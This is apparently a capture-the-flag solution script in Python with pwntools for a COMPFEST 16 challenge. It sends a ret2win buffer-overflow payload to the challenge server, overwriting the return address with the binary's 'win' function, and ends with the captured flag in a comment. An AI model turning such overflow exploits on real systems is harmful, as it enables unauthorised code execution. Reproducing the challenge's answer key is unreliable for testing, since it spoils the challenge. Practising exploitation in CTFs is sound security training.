from pwn import *

# Set up the context for the exploit
context.update(arch='amd64', os='linux', bits=64)

# Addresses and offsets
binary = './chall'
elf = ELF(binary)

# Start the process or connect to the remote service
#p = process(binary)
p = remote('challenges.ctf.compfest.id', 20006)  # Replace with target IP and port

# Gadget and address locations
win_addr = elf.symbols['win']
log.info(f"win function address: {hex(win_addr)}")

# Offsets
buffer_size = 32
offset_to_return = buffer_size + 8 # buffer + saved rbp

# Payload construction
payload = b'A' * offset_to_return
payload += p64(win_addr)  # Overwrite return address with win function address

# Send payload
p.sendlineafter("sebutkan mantra sakti tersebut: ", payload)

# Receive the response
p.interactive()
#COMPFEST16{still_easy_ret2win_right?_a4e27d3beb}

